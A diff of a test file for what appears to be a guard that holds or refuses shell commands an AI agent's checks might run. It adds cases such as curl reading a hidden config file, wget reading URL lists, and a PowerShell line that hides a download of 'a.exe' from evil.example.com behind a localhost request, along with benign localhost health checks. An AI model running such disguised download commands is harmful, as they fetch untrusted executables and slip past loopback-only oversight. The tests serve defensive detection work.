@@ -124,6 +124,13 @@ try {
     'curl --proxy http://localhost:1@evil.example.com:3128 -o tool.exe http://localhost/tool.exe',
     'curl -K more.txt -o tool.exe http://localhost/tool.exe',
     "iwr http://localhost/x;iwr('evil.example.com') -OutFile a.exe",
+    // The same options, spelled out, quoted as -ArgumentList hands them over, or wget's.
+    'curl --config more.txt -o tool.exe http://localhost/tool.exe',
+    "Start-Process curl.exe -ArgumentList '--config','more.txt','http://localhost/tool.exe'",
+    'wget --input-file=urls.txt http://localhost/x',
+    'wget --execute robots=off http://localhost/x',
+    // Only a path's folders are not hosts: before its first `\`, a name is read as one, as before a `/`.
+    'iwr http://localhost:3000; iwr evil.example.com\\a.exe -OutFile a.exe',
   ];
   for (const cmd of rerouted) {
     t.truthy(`held, not exempt as loopback: ${cmd}`, networkFetchReason(cmd) !== null, 'networkFetchReason returned null');
@@ -144,9 +151,28 @@ try {
     'Invoke-WebRequest -Uri http://localhost:3000/health -OutFile C:\\out\\health.json',
     'curl -k https://localhost:5001/health',
     'curl -i http://localhost:3000/health',
+    /*
+     * An output file under a drive whose extension is not a known one, and a folder named like a
+     * domain. Split at the drive's colon, `C:\work\Shop.Web` gave `\work\Shop.Web`, whose `Web` read
+     * as a top-level domain, and each of these was held, or refused as a check's command.
+     */
+    'curl http://localhost:3000/api/items -o C:\\work\\app\\out\\items.response',
+    'curl.exe -s http://localhost:3000/ -o C:\\proj\\build.output',
+    'dotnet run --project C:\\work\\Shop.Web --urls http://localhost:5000; curl http://localhost:5000/health',
+    'Invoke-WebRequest http://127.0.0.1:5000/health -OutFile:C:\\work\\health.response',
+    'curl -o out\\items.response http://localhost:3000/api/items',
+    // Another program's --config is not curl's: only curl reads curl's options, and only on its own statement.
+    'node server.js --config config\\dev.json; Invoke-WebRequest http://localhost:3000/health -UseBasicParsing',
+    "Start-Process node -ArgumentList 'server.js','--config','dev.json'; Start-Sleep 2; curl http://localhost:3000/health",
+    'npx playwright test --config=playwright.config.ts; curl http://127.0.0.1:5173/',
+    'node server.js --config dev.json\ncurl http://localhost:3000/health',
   ]) {
-    t.check(`not held: ${cmd}`, networkFetchReason(cmd), null);
+    t.check(`not held: ${cmd.replace(/\n/g, ' \\n ')}`, networkFetchReason(cmd), null);
   }
+  // A check's command, which nobody is asked about: a loopback check that saves under a drive runs.
+  const savedUnderDrive = `Invoke-WebRequest -Uri http://localhost:5000/health -OutFile ${join(tmp, 'out', 'health.result')}`;
+  t.truthy('(the project folder is a path under a drive)', /^[A-Za-z]:\\/.test(tmp), tmp);
+  t.check(`not refused as a check's command: ${savedUnderDrive}`, checkCommandRefusal(savedUnderDrive, 'pwsh', shipped, project), null);
   /*
    * Decision pin: a loopback download saved as `a.zip` is held today. `zip` is not in
    * FILE_EXTENSIONS, so the output name reads as a second host beside the loopback URL, and the
@@ -430,6 +456,11 @@ try {
   t.truthy('writing a script and running it in one line is refused', writeAndRun !== null && writeAndRun.includes('writes a script and runs it'), short(writeAndRun));
   const fetched = checkCommandRefusal('.\\fetch.ps1', 'pwsh', { denyPatterns: shipped.denyPatterns, allowedPrograms: [] }, project);
   t.truthy("a check running a script that downloads is refused as a network fetch", fetched !== null && fetched.includes('fetches from the network'), short(fetched));
+  // A smoke script is read whole: a server started with its own --config on one line does not make
+  // the localhost health check on the next one a curl told to read a file.
+  await writeFile(join(tmp, 'smoke.ps1'), 'node server.js --config dev.json\nInvoke-WebRequest http://localhost:3000/health -UseBasicParsing\n');
+  const smoke = checkCommandRefusal('.\\smoke.ps1', 'pwsh', { denyPatterns: shipped.denyPatterns, allowedPrograms: [] }, project);
+  t.check('a check running a smoke script with a server --config and a localhost health check is not refused', smoke, null);
 
   /*
    * The operator's list is theirs to write, and a typo in it must not switch it off: an invalid
